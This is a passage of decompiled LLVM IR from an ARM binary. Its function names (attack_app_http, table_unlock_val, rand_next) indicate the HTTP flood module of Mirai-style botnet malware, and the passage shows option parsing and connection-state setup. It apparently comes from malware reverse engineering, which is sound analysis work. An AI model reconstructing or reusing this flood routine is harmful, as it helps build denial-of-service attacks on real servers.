  %v3_8884 = mul i32 %v0_8884, 4
  store i32 %v3_8884, i32* %r1.global-to-local, align 4
  %v5_8888 = inttoptr i32 %v2_8878 to i32*
  %v6_8888 = call i32 @realloc(i32* %v5_8888, i32 %v3_8884, i32 ptrtoint (i32* @global_var_88dc.54 to i32), i32 9)
  %v2_888c = load i8, i8* bitcast (i8** @global_var_24694.31 to i8*), align 4
  %v3_888c = zext i8 %v2_888c to i32
  store i32 %v3_888c, i32* %r3.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v6_8888, i32* %v2_8890, align 4
  %v0_8894 = load i32, i32* @r4, align 4
  %v2_8894 = load i32, i32* %r3.global-to-local, align 4
  %v5_8894 = mul i32 %v2_8894, 4
  %v6_8894 = add i32 %v5_8894, %v6_8888
  %v7_8894 = inttoptr i32 %v6_8894 to i32*
  store i32 %v0_8894, i32* %v7_8894, align 4
  %v0_8898 = load i32, i32* %r3.global-to-local, align 4
  %v1_8898 = load i32, i32* @r8, align 4
  %v2_8898 = add i32 %v1_8898, %v0_8898
  store i32 %v2_8898, i32* %r2.global-to-local, align 4
  %v1_88a0 = trunc i32 %v2_8898 to i8
  %v2_88a0 = load i32, i32* @r5, align 4
  %v3_88a0 = inttoptr i32 %v2_88a0 to i8*
  store i8 %v1_88a0, i8* %v3_88a0, align 1
  %v2_88a4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_88a4, i32* @r4, align 4
  store i32 %v6_85a0, i32* @r5, align 4
  store i32 %v9_85a0, i32* @r6, align 4
  store i32 %v12_85a0, i32* @r7, align 4
  store i32 %v15_85a0, i32* @r8, align 4
  ret i32 %v1_8898

; uselistorder directives
  uselistorder i32 %v1_8898, { 1, 0 }
  uselistorder i32 %v3_8884, { 1, 0 }
  uselistorder i32 %v1_8850, { 1, 0 }
  uselistorder i32 %v3_8838, { 1, 0 }
  uselistorder i32 %v1_8804, { 1, 0 }
  uselistorder i32 %v3_87ec, { 1, 0 }
  uselistorder i32 %v1_87b8, { 1, 0 }
  uselistorder i32 %v3_87a0, { 1, 0 }
  uselistorder i32 %v1_876c, { 1, 0 }
  uselistorder i32 %v3_8754, { 1, 0 }
  uselistorder i32 %v1_8720, { 1, 0 }
  uselistorder i32 %v3_8708, { 1, 0 }
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %v3_86bc, { 1, 0 }
  uselistorder i32 %v1_8688, { 1, 0 }
  uselistorder i32 %v6_8674, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8670, { 1, 0 }
  uselistorder i32 %v1_863c, { 1, 0 }
  uselistorder i32 %v3_8624, { 1, 0 }
  uselistorder i32 %v2_8600, { 1, 0 }
  uselistorder i32 %v6_85dc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_85d8, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_24694.31 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_24695.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_24694.31, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_24694.31 to i32), { 1, 0 }
}

define i32 @attack_app_http(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_88dc = load i32, i32* @r4, align 4
  %v18_88dc = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %arg4 to i32*
  %v6_8908 = call i32 @attack_get_opt_str(i32 %arg3, i32* %v5_8908, i32 20, i32 0, i32 %arg2)
  %v0_890c = load i32, i32* @r5, align 4
  store i32 %v0_890c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v0_8918 = load i32, i32* @r4, align 4
  store i32 %v0_8918, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b3b8.56 to i32), i32* %r3.global-to-local, align 4
  %v6_8920 = inttoptr i32 %v0_890c to i32*
  %v7_8920 = call i32 @attack_get_opt_str(i32 %v0_8918, i32* %v6_8920, i32 19, i32 ptrtoint ([4 x i8]* @global_var_1b3b8.56 to i32), i32 %v6_8908)
  %v0_8924 = load i32, i32* @r5, align 4
  store i32 %v0_8924, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8920, i32* @sb, align 4
  %v0_8934 = load i32, i32* @r4, align 4
  store i32 %v0_8934, i32* %r0.global-to-local, align 4
  %v5_8938 = inttoptr i32 %v0_8924 to i32*
  %v6_8938 = call i32 @attack_get_opt_str(i32 %v0_8934, i32* %v5_8938, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_893c = load i32, i32* @r5, align 4
  store i32 %v0_893c, i32* %r1.global-to-local, align 4
  store i32 %v6_8938, i32* @sl, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  %v0_8948 = load i32, i32* @r4, align 4
  store i32 %v0_8948, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3bc.58 to i32), i32* %r3.global-to-local, align 4
  %v5_8950 = inttoptr i32 %v0_893c to i32*
  %v6_8950 = call i32 @attack_get_opt_str(i32 %v0_8948, i32* %v5_8950, i32 21, i32 ptrtoint (i32* @global_var_1b3bc.58 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8954 = load i32, i32* @r5, align 4
  store i32 %v0_8954, i32* %r1.global-to-local, align 4
  store i32 %v6_8950, i32* @r8, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  %v0_8960 = load i32, i32* @r4, align 4
  store i32 %v0_8960, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8968 = inttoptr i32 %v0_8954 to i32*
  %v5_8968 = call i32 @attack_get_opt_int(i32 %v0_8960, i32* %v4_8968, i32 23, i32 1)
  %v0_896c = load i32, i32* @r5, align 4
  store i32 %v0_896c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8968, i32* @r6, align 4
  %v0_897c = load i32, i32* @r4, align 4
  store i32 %v0_897c, i32* %r0.global-to-local, align 4
  %v4_8980 = inttoptr i32 %v0_896c to i32*
  %v5_8980 = call i32 @attack_get_opt_int(i32 %v0_897c, i32* %v4_8980, i32 7, i32 80)
  %v2_8988 = ptrtoint i32* %stack_var_-20813 to i32
  %v3_8990 = mul i32 %v5_8980, 65536
  store i32 %v3_8990, i32* %r3.global-to-local, align 4
  %tmp168 = bitcast i32* %stack_var_-20813 to i8*
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_89a4 = urem i32 %v5_8980, 65536
  store i32 %v3_89a4, i32* @r7, align 4
  %v4_89a8 = call i32 @__GI_memset(i8* %tmp168, i32 0, i32 10241)
  store i32 %v4_89a8, i32* %r0.global-to-local, align 4
  %v0_89ac = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_89ac = icmp eq i32 %v0_89ac, 0
  store i1 %v2_89ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_89ac, label %.thread14, label %bb

bb:                                               ; preds = %entry
  %v1_89b0 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_89b0 = icmp eq i32 %v1_89b0, 0
  store i1 %v3_89b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_89b0, label %bb169, label %dec_label_pc_89d0

.thread14:                                        ; preds = %entry
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_89c0

bb169:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_89c0

dec_label_pc_89c0:                                ; preds = %bb169, %dec_label_pc_89f0, %.thread14, %dec_label_pc_89e0, %dec_label_pc_89d0
  %v1_89cc = phi i32 [ %v2_89f4, %dec_label_pc_89f0 ], [ %v4_89a8, %.thread14 ], [ %v4_89a8, %bb169 ], [ %v2_89e4, %dec_label_pc_89e0 ], [ %v2_89d4, %dec_label_pc_89d0 ]
  store i32 %v3_88dc, i32* %r4.global-to-local, align 4
  store i32 %v18_88dc, i32* %sb.global-to-local, align 4
  ret i32 %v1_89cc

dec_label_pc_89d0:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_89ac, i32* %r0.global-to-local, align 4
  %v1_89d4 = inttoptr i32 %v0_89ac to i8*
  %v2_89d4 = call i32 @util_strlen(i8* %v1_89d4)
  store i32 %v2_89d4, i32* %r0.global-to-local, align 4
  %v2_89d8 = icmp ugt i32 %v2_89d4, 254
  store i1 %v2_89d8, i1* %cpsr_c.global-to-local, align 1
  %v7_89d8 = icmp eq i32 %v2_89d4, 255
  store i1 %v7_89d8, i1* %cpsr_z.global-to-local, align 1
  %v8_89dc = icmp sgt i32 %v2_89d4, 255
  br i1 %v8_89dc, label %dec_label_pc_89c0, label %dec_label_pc_89e0

dec_label_pc_89e0:                                ; preds = %dec_label_pc_89d0
  %v0_89e0 = load i32, i32* @sl, align 4
  store i32 %v0_89e0, i32* %r0.global-to-local, align 4
  %v1_89e4 = inttoptr i32 %v0_89e0 to i8*
  %v2_89e4 = call i32 @util_strlen(i8* %v1_89e4)
  store i32 %v2_89e4, i32* %r0.global-to-local, align 4
  %v2_89e8 = icmp ugt i32 %v2_89e4, 126
  store i1 %v2_89e8, i1* %cpsr_c.global-to-local, align 1
  %v7_89e8 = icmp eq i32 %v2_89e4, 127
  store i1 %v7_89e8, i1* %cpsr_z.global-to-local, align 1
  %v8_89ec = icmp sgt i32 %v2_89e4, 127
  br i1 %v8_89ec, label %dec_label_pc_89c0, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0
  %v0_89f0 = load i32, i32* @sb, align 4
  store i32 %v0_89f0, i32* %r0.global-to-local, align 4
  %v1_89f4 = inttoptr i32 %v0_89f0 to i8*
  %v2_89f4 = call i32 @util_strlen(i8* %v1_89f4)
  store i32 %v2_89f4, i32* %r0.global-to-local, align 4
  %v2_89f8 = icmp ugt i32 %v2_89f4, 8
  store i1 %v2_89f8, i1* %cpsr_c.global-to-local, align 1
  %v7_89f8 = icmp eq i32 %v2_89f4, 9
  store i1 %v7_89f8, i1* %cpsr_z.global-to-local, align 1
  %v7_89fc = icmp sgt i32 %v2_89f4, 9
  br i1 %v7_89fc, label %dec_label_pc_89c0, label %bb170

bb170:                                            ; preds = %dec_label_pc_89f0
  %v10_89fc = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  %v8_8a00 = load i32, i32* @r4, align 4
  %v10_8a00 = add i32 %v10_89fc, 364
  %v11_8a00 = inttoptr i32 %v10_8a00 to i32*
  store i32 %v8_8a00, i32* %v11_8a00, align 4
  br label %dec_label_pc_8a08

dec_label_pc_8a08:                                ; preds = %bb170, %bb174
  %v0_8a08 = load i32, i32* @sb, align 4
  store i32 %v0_8a08, i32* %r0.global-to-local, align 4
  %v1_8a0c = inttoptr i32 %v0_8a08 to i8*
  %v2_8a0c = call i32 @util_strlen(i8* %v1_8a0c)
  store i32 %v2_8a0c, i32* %r0.global-to-local, align 4
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  %v3_8a14 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8a14, i32* %ip.global-to-local, align 4
  %v3_8a18 = icmp uge i32 %v2_8a0c, %v3_8a14
  store i1 %v3_8a18, i1* %cpsr_c.global-to-local, align 1
  %v9_8a18 = icmp eq i32 %v2_8a0c, %v3_8a14
  store i1 %v9_8a18, i1* %cpsr_z.global-to-local, align 1
  %v7_8a1c = icmp sgt i32 %v2_8a0c, %v3_8a14
  br i1 %v7_8a1c, label %dec_label_pc_8a20, label %dec_label_pc_8a4c

dec_label_pc_8a20:                                ; preds = %dec_label_pc_8a08
  %v0_8a20 = load i32, i32* @sb, align 4
  %v2_8a20 = add i32 %v0_8a20, %v3_8a14
  %v3_8a20 = inttoptr i32 %v2_8a20 to i8*
  %v4_8a20 = load i8, i8* %v3_8a20, align 1
  %v6_8a20 = zext i8 %v4_8a20 to i32
  %v1_8a24 = add nsw i32 %v6_8a20, -32
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v1_8a28 = add nsw i32 %v6_8a20, -97
  store i32 %v1_8a28, i32* %r3.global-to-local, align 4
  %v2_8a2c = icmp ugt i32 %v1_8a28, 24
  store i1 %v2_8a2c, i1* %cpsr_c.global-to-local, align 1
  %v7_8a2c = icmp eq i32 %v1_8a28, 25
  store i1 %v7_8a2c, i1* %cpsr_z.global-to-local, align 1
  %v2_8a30 = xor i1 %v2_8a2c, true
  %v3_8a30 = or i1 %v7_8a2c, %v2_8a30
  br i1 %v3_8a30, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_8a20
  %v5_8a30 = trunc i32 %v1_8a24 to i8
  store i8 %v5_8a30, i8* %v3_8a20, align 1
  %v0_8a34.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8a34.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_8a20, %bb171
  %v1_8a38 = phi i1 [ %v2_8a2c, %dec_label_pc_8a20 ], [ %v1_8a34.pre, %bb171 ]
  %v0_8a38 = phi i1 [ false, %dec_label_pc_8a20 ], [ %v0_8a34.pre, %bb171 ]
  %v2_8a34 = xor i1 %v1_8a38, true
  %v3_8a34 = or i1 %v0_8a38, %v2_8a34
  br i1 %v3_8a34, label %bb173, label %._crit_edge

._crit_edge:                                      ; preds = %bb172
  %v0_8a40.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb174

bb173:                                            ; preds = %bb172
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v7_8a38 = load i32, i32* %v11_8a00, align 4
  store i32 %v7_8a38, i32* %ip.global-to-local, align 4
  br label %bb174

bb174:                                            ; preds = %._crit_edge, %bb173
  %v0_8a40 = phi i32 [ %v0_8a40.pre, %._crit_edge ], [ %v7_8a38, %bb173 ]
  store i32 %v10_89fc, i32* @lr, align 4
  %v1_8a40 = add i32 %v0_8a40, 1
  store i32 %v1_8a40, i32* %ip.global-to-local, align 4
  store i32 %v1_8a40, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8a08

dec_label_pc_8a4c:                                ; preds = %dec_label_pc_8a08
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_8a50 = call i32 @table_unlock_val(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8a58 = call i32 @table_unlock_val(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_8a60 = call i32 @table_unlock_val(i32 45)
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_8a68 = call i32 @table_unlock_val(i32 46)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_8a70 = call i32 @table_unlock_val(i32 47)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_8a78 = call i32 @table_unlock_val(i32 48)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_8a80 = call i32 @table_unlock_val(i32 49)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_8a88 = call i32 @table_unlock_val(i32 50)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_8a90 = call i32 @table_unlock_val(i32 51)
  store i32 52, i32* %r0.global-to-local, align 4
  %v1_8a98 = call i32 @table_unlock_val(i32 52)
  store i32 %v1_8a98, i32* %r0.global-to-local, align 4
  %v0_8a9c = load i32, i32* @r6, align 4
  %v3_8a9c = icmp ugt i32 %v0_8a9c, 511
  store i1 %v3_8a9c, i1* %cpsr_c.global-to-local, align 1
  %v8_8a9c = icmp eq i32 %v0_8a9c, 512
  store i1 %v8_8a9c, i1* %cpsr_z.global-to-local, align 1
  %v5_8aa0 = icmp slt i32 %v0_8a9c, 512
  br i1 %v5_8aa0, label %thread-pre-split, label %bb175

bb175:                                            ; preds = %dec_label_pc_8a4c
  store i32 512, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8a4c, %bb175
  %v0_8aa8 = phi i32 [ 512, %bb175 ], [ %v0_8a9c, %dec_label_pc_8a4c ]
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_8aac = call i32 @table_unlock_val(i32 53)
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_8abc = call i32 @calloc(i32 %v0_8aa8, i32 3140)
  store i32 %v2_8abc, i32* %r0.global-to-local, align 4
  store i32 %v0_8aa8, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8ac4 = icmp eq i32 %v0_8aa8, 0
  store i1 %v2_8ac4, i1* %cpsr_z.global-to-local, align 1
  %tmp176 = icmp slt i32 %v0_8aa8, 1
  br i1 %tmp176, label %dec_label_pc_8c08, label %dec_label_pc_8ad0

dec_label_pc_8ad0:                                ; preds = %thread-pre-split
  store i32 %v2_8abc, i32* @r5, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_8ad8

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_a550, %dec_label_pc_8ad0
  %v1_8ae4 = phi i32 [ %v1_a56c, %dec_label_pc_a550 ], [ %v2_8abc, %dec_label_pc_8ad0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_8ae4 = inttoptr i32 %v1_8ae4 to i32*
  store i32 -1, i32* %v2_8ae4, align 4
  %v0_8ae8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8ae8 = trunc i32 %v0_8ae8 to i8
  %v2_8ae8 = load i32, i32* @r5, align 4
  %v3_8ae8 = add i32 %v2_8ae8, 4
  %v4_8ae8 = inttoptr i32 %v3_8ae8 to i8*
  store i8 %v1_8ae8, i8* %v4_8ae8, align 1
  %v0_8aec = load i32, i32* %fp.global-to-local, align 4
  %v1_8af0 = load i32, i32* %r1.global-to-local, align 4
  %v2_8af0 = udiv i32 %v0_8aec, %v1_8af0
  %v3_8af0 = urem i32 %v0_8aec, %v1_8af0
  store i32 %v2_8af0, i32* %r0.global-to-local, align 4
  store i32 %v3_8af0, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_8afc = and i32 %v3_8af0, 536870912
  %v3_8afc = icmp ne i32 %v2_8afc, 0
  store i1 %v3_8afc, i1* %cpsr_c.global-to-local, align 1
  %v5_8afc = mul i32 %v3_8af0, 24
  store i32 %v5_8afc, i32* %r3.global-to-local, align 4
  %v2_8b00 = add i32 %v5_8afc, %arg2
  store i32 %v2_8b00, i32* @r6, align 4
  %v1_8b04 = add i32 %v2_8b00, 16
  %v2_8b04 = inttoptr i32 %v1_8b04 to i32*
  %v3_8b04 = load i32, i32* %v2_8b04, align 4
  store i32 %v3_8b04, i32* %r2.global-to-local, align 4
  %v0_8b08 = load i32, i32* @r5, align 4
  %v1_8b08 = add i32 %v0_8b08, 532
  store i32 %v1_8b08, i32* @lr, align 4
  store i32 %v1_8b08, i32* @r0, align 4
  %v0_8b10 = load i32, i32* @r8, align 4
  store i32 %v0_8b10, i32* %r1.global-to-local, align 4
  %v2_8b14 = add i32 %v0_8b08, 16
  %v3_8b14 = inttoptr i32 %v2_8b14 to i32*
  store i32 %v3_8b04, i32* %v3_8b14, align 4
  %v0_8b18 = load i32, i32* @lr, align 4
  %v2_8b1c = inttoptr i32 %v1_8b08 to i8*
  %v3_8b1c = call i32 @util_strcpy(i8* %v2_8b1c, i32 %v0_8b10)
  store i32 %v3_8b1c, i32* %r0.global-to-local, align 4
  %v0_8b20 = load i32, i32* @r5, align 4
  %v1_8b20 = add i32 %v0_8b20, 532
  %v2_8b20 = inttoptr i32 %v1_8b20 to i8*
  %v3_8b20 = load i8, i8* %v2_8b20, align 1
  %v4_8b20 = zext i8 %v3_8b20 to i32
  store i32 %v4_8b20, i32* %r3.global-to-local, align 4
  %v2_8b24 = icmp ugt i8 %v3_8b20, 46
  store i1 %v2_8b24, i1* %cpsr_c.global-to-local, align 1
  %v7_8b24 = icmp eq i8 %v3_8b20, 47
  store i1 %v7_8b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b24, label %dec_label_pc_8b50, label %dec_label_pc_8b2c

dec_label_pc_8b2c:                                ; preds = %dec_label_pc_8ad8
  store i32 %v0_8b18, i32* %r0.global-to-local, align 4
  %v1_8b30 = inttoptr i32 %v0_8b18 to i8*
  %v2_8b30 = call i32 @util_strlen(i8* %v1_8b30)
  store i32 %v2_8b30, i32* @r2, align 4
  %v0_8b38 = load i32, i32* @r5, align 4
  %v1_8b3c = add i32 %v0_8b38, 533
  store i32 %v1_8b3c, i32* @r0, align 4
  store i32 %v0_8b18, i32* @r1, align 4
  %v3_8b44 = call i32 @memmove(i32 %v1_8b3c, i32 %v0_8b18, i32 %v2_8b30)
  store i32 %v3_8b44, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8b4c = load i32, i32* @r5, align 4
  %v3_8b4c = add i32 %v2_8b4c, 532
  %v4_8b4c = inttoptr i32 %v3_8b4c to i8*
  store i8 47, i8* %v4_8b4c, align 1
  %v0_8b54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8b50

dec_label_pc_8b50:                                ; preds = %dec_label_pc_8ad8, %dec_label_pc_8b2c
  %v0_8b54 = phi i32 [ %v0_8b20, %dec_label_pc_8ad8 ], [ %v0_8b54.pre, %dec_label_pc_8b2c ]
  %v0_8b50 = load i32, i32* @sb, align 4
  store i32 %v0_8b50, i32* %r1.global-to-local, align 4
  %v1_8b54 = add i32 %v0_8b54, 1440
  store i32 %v1_8b54, i32* @r0, align 4
  %v2_8b58 = inttoptr i32 %v1_8b54 to i8*
  %v3_8b58 = call i32 @util_strcpy(i8* %v2_8b58, i32 %v0_8b50)
  %v0_8b5c = load i32, i32* @r5, align 4
  %v0_8b60 = load i32, i32* @sb, align 4
  store i32 %v0_8b60, i32* %r1.global-to-local, align 4
  %v1_8b64 = add i32 %v0_8b5c, 1431
  store i32 %v1_8b64, i32* @r0, align 4
  %v2_8b68 = inttoptr i32 %v1_8b64 to i8*
  %v3_8b68 = call i32 @util_strcpy(i8* %v2_8b68, i32 %v0_8b60)
  %v0_8b6c = load i32, i32* @r5, align 4
  %v1_8b70 = add i32 %v0_8b6c, 789
  store i32 %v1_8b70, i32* @r0, align 4
  %v0_8b74 = load i32, i32* @sl, align 4
  store i32 %v0_8b74, i32* %r1.global-to-local, align 4
  %v2_8b78 = inttoptr i32 %v1_8b70 to i8*
  %v3_8b78 = call i32 @util_strcpy(i8* %v2_8b78, i32 %v0_8b74)
  store i32 %v3_8b78, i32* %r0.global-to-local, align 4
  %v0_8b7c = load i32, i32* @r6, align 4
  %v1_8b7c = add i32 %v0_8b7c, 20
  %v2_8b7c = inttoptr i32 %v1_8b7c to i8*
  %v3_8b7c = load i8, i8* %v2_8b7c, align 1
  %v4_8b7c = zext i8 %v3_8b7c to i32
  store i32 %v4_8b7c, i32* %r3.global-to-local, align 4
  %v2_8b80 = icmp ugt i8 %v3_8b7c, 30
  store i1 %v2_8b80, i1* %cpsr_c.global-to-local, align 1
  %v7_8b80 = icmp eq i8 %v3_8b7c, 31
  store i1 %v7_8b80, i1* %cpsr_z.global-to-local, align 1
  %v2_8b84 = xor i1 %v7_8b80, true
  %v3_8b84 = and i1 %v2_8b80, %v2_8b84
  br i1 %v3_8b84, label %dec_label_pc_8bcc, label %dec_label_pc_8b88

dec_label_pc_8b88:                                ; preds = %dec_label_pc_8b50
  %v1_8b88 = add i32 %v0_8b7c, 16
  %v2_8b88 = inttoptr i32 %v1_8b88 to i32*
  %v3_8b88 = load i32, i32* %v2_8b88, align 4
  store i32 %v3_8b88, i32* @r4, align 4
  %v0_8b8c = call i32 @rand_next()
  store i32 %v0_8b8c, i32* %r0.global-to-local, align 4
  %v0_8b90 = load i32, i32* @r4, align 4
  %v1_8b90 = and i32 %v0_8b90, 16711680
  store i32 %v1_8b90, i32* %r1.global-to-local, align 4
  %v3_8b94 = udiv i32 %v0_8b90, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_8b98 = udiv i32 %v1_8b90, 256
  %v5_8b98 = or i32 %v4_8b98, %v3_8b94
  store i32 %v5_8b98, i32* %r2.global-to-local, align 4
  %v1_8b9c = and i32 %v0_8b90, 65280
  store i32 %v1_8b9c, i32* %r3.global-to-local, align 4
  %v0_8ba0 = load i32, i32* @r6, align 4
  %v1_8ba0 = add i32 %v0_8ba0, 20
  %v2_8ba0 = inttoptr i32 %v1_8ba0 to i8*
  %v3_8ba0 = load i8, i8* %v2_8ba0, align 1
  %v4_8ba0 = zext i8 %v3_8ba0 to i32
  %v5_8ba8 = call i32 @llvm.bswap.i32(i32 %v0_8b90)
  %v7_8bac = lshr i32 %v0_8b8c, %v4_8ba0
  %v8_8bac = add i32 %v7_8bac, %v5_8ba8
  store i32 %v8_8bac, i32* %r2.global-to-local, align 4
  %v1_8bb0 = and i32 %v8_8bac, 16711680
  store i32 %v1_8bb0, i32* %r0.global-to-local, align 4
  %v1_8bbc = and i32 %v8_8bac, 65280
  store i32 %v1_8bbc, i32* %r1.global-to-local, align 4
  %v2_8bc4 = and i32 %v8_8bac, 256
  %v3_8bc4 = icmp ne i32 %v2_8bc4, 0
  store i1 %v3_8bc4, i1* %cpsr_c.global-to-local, align 1
  %v5_8bc4 = call i32 @llvm.bswap.i32(i32 %v8_8bac)
  store i32 %v5_8bc4, i32* %r3.global-to-local, align 4
  %v1_8bc8 = load i32, i32* @r5, align 4
  %v2_8bc8 = add i32 %v1_8bc8, 16
  %v3_8bc8 = inttoptr i32 %v2_8bc8 to i32*
  store i32 %v5_8bc4, i32* %v3_8bc8, align 4
  br label %dec_label_pc_8bcc

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8b50, %dec_label_pc_8b88
  %v0_8bcc = call i32 @rand_next()
  %v3_8bd8 = udiv i32 %v0_8bcc, 5
  store i32 %v3_8bd8, i32* %r2.global-to-local, align 4
  store i32 %v3_8bd8, i32* %r3.global-to-local, align 4
  %v2_8be4 = sub i32 %v0_8bcc, %v3_8bd8
  store i32 %v2_8be4, i32* %r0.global-to-local, align 4
  %v7_8be8 = icmp eq i32 %v2_8be4, 4
  store i1 %v7_8be8, i1* %cpsr_z.global-to-local, align 1
  %v5_8bec = and i32 %v2_8be4, 1073741824
  %v6_8bec = icmp ne i32 %v5_8bec, 0
  store i1 %v6_8bec, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_8be4, label %dec_label_pc_a550 [
    i32 0, label %dec_label_pc_a614
    i32 1, label %dec_label_pc_a5e8
    i32 2, label %dec_label_pc_a640
    i32 3, label %dec_label_pc_a528
    i32 4, label %dec_label_pc_a5a8
  ]

dec_label_pc_8c08:                                ; preds = %thread-pre-split
  %v0_8c18 = load i32, i32* @r7, align 4
  %v1_8c18 = and i32 %v0_8c18, 128
  %v2_8c18 = icmp ne i32 %v1_8c18, 0
  store i1 %v2_8c18, i1* %cpsr_c.global-to-local, align 1
  %v3_8c18 = udiv i32 %v0_8c18, 256
  store i32 %v3_8c18, i32* %r3.global-to-local, align 4
  %v1_8c1c = add i32 %v2_8abc, 1452
  store i32 %v1_8c1c, i32* %r1.global-to-local, align 4
  %v2_8c20 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_8c20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8c38.preheader

dec_label_pc_8c38.preheader:                      ; preds = %dec_label_pc_8c08, %dec_label_pc_a574
  %v0_a584.sink = phi i32 [ %v0_a584, %dec_label_pc_a574 ], [ %v0_8c18, %dec_label_pc_8c08 ]
